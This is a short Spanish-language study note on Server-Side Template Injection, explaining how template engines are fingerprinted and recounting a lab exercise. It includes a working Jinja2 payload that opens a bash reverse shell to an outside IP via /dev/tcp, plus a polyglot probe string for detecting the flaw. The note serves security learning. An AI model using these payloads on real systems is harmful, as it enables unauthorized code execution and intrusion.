### ¿Qué es SSTI? 
El Server-Side Template Injection traduciría a algo como Inyección en las Plantillas del Lado del Servidor, y acontece cuando es capaz de inyectar un payload malicioso en una de estas plantillas, normalmente en forma de comandos. Los *template engines* funcionan interpretando información de inputs y modificando la estructura estática de la página con contenido dinámico, que cambia por distintos factores como las acciones del usuario.
Cuando la sanitización de los campos que modifican esta información es insuficiente, el atacante puede aprovecharse enviando comandos directamente al servidor, llevando al control total del sistema en forma de RCEs o similares.
Realmente, no es que los comandos se envíen directamente, la idea es ir probando distintos payloads para identificar a que template engine nos enfrentamos, una vez ya sabemos esto, podemos explotar de manera crítica buscando el RCE.
![[ssti.png|554x334]]
Por ejemplo, en un laboratorio que acabo de resolver, tras descubrir con `{{7*7}}` que estaba trabajando con un Jinja2, sirviéndome de los recursos de PayLoadsAllTheThings y PortSwigger conseguimos muy fácilmente una revshell con esta línea:
``` python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >& /dev/tcp/192.168.1.157/443 0>&1'").read() }}
```

## Metodología

![[SSTI-steps.png|373x384]]

## Payloads 
En la mayoría de casos, este payload mostrará un error si es que la web es vulnerable a SSTI:
```
${{>%[%'"}}%\. 
```
### Recursos
[Demostración de Seven Seas Security](https://youtu.be/8o5QPU-BvFQ)
[SSTImap](https://github.com/vladko312/SSTImap)
[Table de template injection](https://cheatsheet.hackmanit.de/template-injection-table/)
[Demo de explotación](https://youtu.be/8o5QPU-BvFQ?list=PL65_wYSEg5HdSq1pSZxQmz7SoNE48vOgR)
### Artículos
[Artículo de PayLoadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
[PortSwigger](https://portswigger.net/web-security/server-side-template-injection)
